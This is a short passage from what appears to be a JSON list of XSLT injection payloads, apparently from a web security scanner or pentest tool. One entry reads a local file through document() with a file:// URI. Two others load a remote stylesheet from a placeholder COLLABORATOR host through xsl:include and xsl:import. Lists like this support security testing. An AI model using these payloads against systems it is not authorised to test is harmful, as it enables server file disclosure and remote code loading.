        {"payload": "<xsl:value-of select=\"document('file:///etc/hostname')\"/>", "description": "document() with file:// URI scheme", "waf_bypass": false},
        {"payload": "<xsl:include href=\"http://COLLABORATOR/evil.xsl\"/>", "description": "xsl:include remote stylesheet via Collaborator", "waf_bypass": false},
        {"payload": "<xsl:import href=\"http://COLLABORATOR/evil.xsl\"/>", "description": "xsl:import remote stylesheet via Collaborator", "waf_bypass": false},
